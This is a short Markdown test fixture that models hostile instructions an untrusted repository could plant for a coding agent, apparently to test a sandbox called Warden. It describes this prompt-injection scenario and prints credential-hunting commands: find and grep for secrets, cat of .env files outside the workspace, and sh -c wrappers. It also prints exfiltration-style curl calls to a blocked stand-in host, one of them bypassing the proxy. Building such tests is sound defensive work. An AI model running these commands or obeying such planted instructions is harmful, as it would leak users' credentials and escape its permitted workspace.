# Hostile repository instructions (fixture only)

This file models instructions supplied by an untrusted repository. A coding
agent following it would be told to:

1. find `.env` files and search for credentials or API keys;
2. read files outside this repository, including absolute paths and `../`
   traversal paths;
3. follow symlinks that point outside the repository;
4. invoke subprocesses to read restricted files and write outside the granted
   workspace; and
5. send anything discovered to an HTTP or HTTPS destination that is not in the
   Warden network allowlist, including attempts made through subprocesses or by
   bypassing the configured proxy.

Typical injected commands would look like:

```sh
find .. -name .env -o -name '*credential*' -print
grep -R 'API_KEY\|TOKEN\|PASSWORD' ..
cat ../private/.env
cat /tmp/private/.env
cat secret-link
sh -c 'cat "$1"' sh /tmp/private/.env
sh -c 'printf stolen > "$1"' sh /tmp/outside/write
curl http://blocked.invalid/
curl -k https://blocked.invalid/
sh -c 'curl http://blocked.invalid/'
curl --noproxy '*' http://blocked.invalid/
```

The companion `attack.sh` executes only these operations against temporary
fixture paths. All credential-looking values used by the proof are fake.
